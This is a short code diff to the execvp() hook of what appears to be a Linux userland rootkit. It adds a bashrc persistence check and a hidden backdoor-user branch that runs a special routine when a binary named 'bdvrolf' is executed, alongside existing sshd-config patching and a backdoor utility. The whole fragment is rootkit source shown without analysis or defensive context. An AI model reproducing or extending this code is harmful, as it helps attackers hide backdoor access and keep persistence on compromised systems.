@@ -8,10 +8,17 @@ int execvp(const char *filename, char *const argv[]){
 #if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
     sshdpatch(REG_USR);
 #endif
+#ifdef ROOTKIT_BASHRC
+    checkbashrc();
+#endif
 
     hook(CEXECVP);
 
     if(is_bdusr()){
+#ifdef BACKDOOR_ROLF
+        if(!fnmatch("*/bdvrolf", argv[0], FNM_PATHNAME))
+            dorolfpls();
+#endif
 #ifdef BACKDOOR_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
             dobdvutil(argv);
